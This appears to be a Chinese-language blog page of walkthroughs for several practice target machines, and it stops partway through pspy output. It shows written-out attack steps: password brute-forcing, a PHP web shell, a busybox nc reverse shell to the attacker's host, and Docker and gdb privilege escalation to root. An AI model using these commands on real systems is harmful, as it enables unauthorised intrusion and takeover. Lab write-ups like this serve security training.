<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hexo
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            hackme
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p>先扫描存活主机和端口号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">nmap -Pn -n <span class="number">192.168</span><span class="number">.56</span><span class="number">.25</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428162655419.png" alt="image-20250428162655419"></p>
<p>啥信息都没有，直接爆破root的密码</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428164929813.png" alt="image-20250428164929813"></p>
<h2 id="pwned"><a href="#pwned" class="headerlink" title="pwned"></a>pwned</h2><p>21端口的ftp无法进行匿名登录</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428182954480.png" alt="image-20250428182954480"></p>
<p>扫目录，dirsearch没扫到有用的，换gobuster</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428183036112.png" alt="image-20250428183036112"></p>
<p>hidden_text获得到信息<img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428183103659.png" alt="image-20250428183103659"></p>
<p>测试发现pwned.vuln可用</p>
<p>得到用户名和密码  ftpuser&#x2F;B0ss_B!TcH</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428183130805.png" alt="image-20250428183130805"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.56</span><span class="number">.26</span></span><br></pre></td></tr></table></figure>



<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428183318205.png" alt="image-20250428183318205"></p>
<p>尝试进行ssh登录，用户名为ariana</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428183849284.png" alt="image-20250428183849284"></p>
<p>id_rsa直接成功登录，尝试提权</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428185417567.png" alt="image-20250428185417567"></p>
<p>这里存在命令注入漏洞</p>
<p>我们可以输入任意 shell 命令，并通过 $msg 被执行</p>
<p>这里成功进入selena用户</p>
<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428185625750.png" alt="image-20250428185625750"></p>
<p>我们发现selena是docker组的</p>
<p>尝试通过docker提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine /<span class="built_in">bin</span>/sh</span><br><span class="line">cp /mnt/<span class="built_in">bin</span>/bash /mnt/tmp/bash</span><br><span class="line">chmod u+s /mnt/tmp/bash</span><br><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure>



<p><img src="D:\github\hexo-blog\source_posts\hackme.assets\image-20250428190505769.png" alt="image-20250428190505769"></p>
<h2 id="connection"><a href="#connection" class="headerlink" title="connection"></a>connection</h2><p>开启了445端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ nmap -Pn -n <span class="number">192.168</span><span class="number">.56</span><span class="number">.27</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-04-<span class="number">28</span> <span class="number">20</span>:<span class="number">31</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.27</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00035</span>s latency).</span><br><span class="line">Not shown: <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp  <span class="built_in">open</span>  http</span><br><span class="line"><span class="number">139</span>/tcp <span class="built_in">open</span>  netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp <span class="built_in">open</span>  microsoft-ds</span><br><span class="line">MAC Address: 08:<span class="number">00</span>:<span class="number">27</span>:BE:<span class="number">53</span>:<span class="number">89</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.42</span> seconds</span><br></pre></td></tr></table></figure>

<p>80端口，扫目录等都没有什么发现</p>
<p>这里去看smb，存在共享文件夹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ smbclient -L //<span class="number">192.168</span><span class="number">.56</span><span class="number">.27</span> -N</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       <span class="type">Type</span>      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        share           Disk      </span><br><span class="line">        <span class="built_in">print</span>$          Disk      Printer Drivers</span><br><span class="line">        IPC$            IPC       IPC Service (Private Share <span class="keyword">for</span> uploading files)</span><br><span class="line">Reconnecting <span class="keyword">with</span> SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            CONNECTION</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有可写权限，这里往文件夹里写个一句话木马</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ smbclient //<span class="number">192.168</span><span class="number">.56</span><span class="number">.27</span>/share -N</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a <span class="built_in">list</span> of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Tue Sep <span class="number">22</span> <span class="number">21</span>:<span class="number">48</span>:<span class="number">39</span> <span class="number">2020</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Tue Sep <span class="number">22</span> <span class="number">21</span>:<span class="number">48</span>:<span class="number">39</span> <span class="number">2020</span></span><br><span class="line">  html                                D        <span class="number">0</span>  Mon Apr <span class="number">28</span> 09:<span class="number">13</span>:<span class="number">43</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7158264</span> blocks of size <span class="number">1024.</span> <span class="number">5439180</span> blocks available</span><br><span class="line">smb: \&gt; cd html</span><br><span class="line">smb: \html\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Mon Apr <span class="number">28</span> 09:<span class="number">13</span>:<span class="number">43</span> <span class="number">2025</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Tue Sep <span class="number">22</span> <span class="number">21</span>:<span class="number">48</span>:<span class="number">39</span> <span class="number">2020</span></span><br><span class="line">  index.html                          N    <span class="number">10701</span>  Tue Sep <span class="number">22</span> <span class="number">21</span>:<span class="number">48</span>:<span class="number">45</span> <span class="number">2020</span></span><br><span class="line">  test.txt                            A        <span class="number">5</span>  Mon Apr <span class="number">28</span> 09:<span class="number">13</span>:<span class="number">12</span> <span class="number">2025</span></span><br><span class="line">  shell.php                           A       <span class="number">31</span>  Mon Apr <span class="number">28</span> 09:<span class="number">13</span>:<span class="number">43</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">                <span class="number">7158264</span> blocks of size <span class="number">1024.</span> <span class="number">5439180</span> blocks available</span><br><span class="line"><span class="comment">#shell.php  ::  &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nc监听去反弹shell，目标机不支持nc命令，但是有busybox</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#http://192.168.56.27/shell.php?cmd=busybox+nc+192.168.56.4+1234+-e+%2fbin%2fbash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nc -lvnp <span class="number">1234</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">1234</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.56</span><span class="number">.27</span>] <span class="number">52658</span></span><br><span class="line">script /dev/null</span><br><span class="line">Script started, file <span class="keyword">is</span> /dev/null</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">index.html  shell.php  test.txt</span><br><span class="line">$ cd /home/connection</span><br><span class="line">cd /home/connection</span><br><span class="line">$ ls  </span><br><span class="line">ls</span><br><span class="line">local.txt</span><br><span class="line">$ cat l*</span><br><span class="line">cat l*</span><br><span class="line">3f491443a2a6aa82bc86a3cda8c39617</span><br></pre></td></tr></table></figure>

<p>接下来寻找存在suid权限的文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/su</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/gdb</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/mount</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br></pre></td></tr></table></figure>

<p>gdb提权</p>
<p>GNU调试器（GDB）允许执行自定义的Python脚本，也就是可以支持编译自定义gdb</p>
<p>使用 gdb 的 -ex 参数运行 Python 脚本，通过 os.execl 启动 &#x2F;bin&#x2F;sh，并使用 -p 参数保留特权（避免丢弃 SUID 赋予的 root 权限）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -nx -ex <span class="string">&#x27;python import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span> -ex quit</span><br><span class="line">gdb -nx -ex <span class="string">&#x27;python import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span> -ex quit</span><br><span class="line">GNU gdb (Debian <span class="number">8.2</span><span class="number">.1</span>-<span class="number">2</span>+b3) <span class="number">8.2</span><span class="number">.1</span></span><br><span class="line">Copyright (C) <span class="number">2018</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> <span class="keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This <span class="keyword">is</span> free software: you are free to change <span class="keyword">and</span> redistribute it.</span><br><span class="line">There <span class="keyword">is</span> NO WARRANTY, to the extent permitted by law.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;show copying&quot;</span> <span class="keyword">and</span> <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured <span class="keyword">as</span> <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual <span class="keyword">and</span> other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>.</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">33</span>(www-data)</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment"># cat p*</span></span><br><span class="line">cat p*</span><br><span class="line">a7c6ea4931ab86fb54c5400204474a39</span><br></pre></td></tr></table></figure>

<h2 id="todd"><a href="#todd" class="headerlink" title="todd"></a>todd</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ nmap  <span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span>  -p-</span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-04-<span class="number">28</span> <span class="number">20</span>:<span class="number">54</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0017</span>s latency).</span><br><span class="line">Not shown: <span class="number">65523</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp    <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp    <span class="built_in">open</span>  http</span><br><span class="line"><span class="number">2247</span>/tcp  <span class="built_in">open</span>  antidotemgrsvr</span><br><span class="line"><span class="number">7066</span>/tcp  <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">7161</span>/tcp  <span class="built_in">open</span>  cabsm-comm</span><br><span class="line"><span class="number">10033</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">13750</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">16960</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">17765</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">23743</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">25802</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line"><span class="number">32612</span>/tcp <span class="built_in">open</span>  unknown</span><br><span class="line">MAC Address: 08:<span class="number">00</span>:<span class="number">27</span>:4F:<span class="number">26</span>:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">16.34</span> seconds</span><br></pre></td></tr></table></figure>

<p>扫描端口发现开启了好多未知端口，但是22，80，7066端口是始终存在的</p>
<p>目录扫描发现tools，给我们了内置了一些扫描工具，但是对我们登录用户没有什么作用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ python dirsearch.py -u http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist size: <span class="number">12289</span></span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">21</span>:04:<span class="number">59</span>] Scanning: </span><br><span class="line">[<span class="number">21</span>:05:<span class="number">14</span>] <span class="number">200</span> -    2KB - /index.html                                       </span><br><span class="line">[<span class="number">21</span>:05:<span class="number">18</span>] <span class="number">403</span> -   278B - /server-status/                                   </span><br><span class="line">[<span class="number">21</span>:05:<span class="number">18</span>] <span class="number">403</span> -   278B - /server-status                                    </span><br><span class="line">[<span class="number">21</span>:05:<span class="number">20</span>] <span class="number">301</span> -   314B - /tools  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span>/tools/           </span><br><span class="line">[<span class="number">21</span>:05:<span class="number">20</span>] <span class="number">200</span> -    1KB - /tools/                                           </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">             Index of /tools</span><br><span class="line">[ICO]	Name	Last modified	Size	Description</span><br><span class="line">[PARENTDIR]	Parent Directory	 	- 	 </span><br><span class="line">[ ]	fscan	<span class="number">2024</span>-02-<span class="number">25</span> 03:<span class="number">32</span> 	<span class="number">6.0</span>M	 </span><br><span class="line">[TXT]	les.sh	<span class="number">2023</span>-<span class="number">11</span>-<span class="number">25</span> 02:<span class="number">00</span> 	89K	 </span><br><span class="line">[TXT]	linpeas.sh	<span class="number">2023</span>-04-<span class="number">17</span> 07:<span class="number">54</span> 	324K	 </span><br><span class="line">[ ]	pspy64	<span class="number">2023</span>-04-<span class="number">17</span> 07:<span class="number">58</span> 	<span class="number">3.0</span>M	 </span><br></pre></td></tr></table></figure>



<p>发现7066和todd是非常相似的，nc连接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/dirsearch-master]</span><br><span class="line">└─$ nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.28</span> <span class="number">7066</span>   </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(todd) gid=<span class="number">1000</span>(todd) groups=<span class="number">1000</span>(todd)</span><br><span class="line">ls </span><br><span class="line">cd /home/todd</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cat u*</span><br><span class="line">Todd&#123;eb93009a2719640de486c4f68daf62ec&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来去利用内置的工具扫描靶机</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">./pspy64</span><br><span class="line">pspy - version: v1<span class="number">.2</span><span class="number">.1</span> - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning <span class="keyword">for</span> processes every 100ms <span class="keyword">and</span> on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2548</span>   | ./pspy64 </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2539</span>   | sh -i </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2538</span>   | script /dev/null </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2516</span>   | nc -e /opt/fake_ssh -lp <span class="number">18315</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2515</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">18315</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2514</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2513</span>   | nc -e /opt/fake_ssh -lp <span class="number">11825</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2512</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">11825</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2510</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2509</span>   | nc -e /opt/fake_ssh -lp <span class="number">25551</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2507</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">25551</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2505</span>   | /<span class="built_in">bin</span>/bash /opt/create_nc.sh </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2504</span>   | nc -e /opt/fake_ssh -lp <span class="number">26427</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2503</span>   | sudo -u todd nc -e /opt/fake_ssh -lp <span class="number">26427</span> </span><br><span class="line"><span class="number">2025</span>/04/<span class="number">28</span> <span class="number">21</span>:08:<span class="number">38</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2501</span>   | 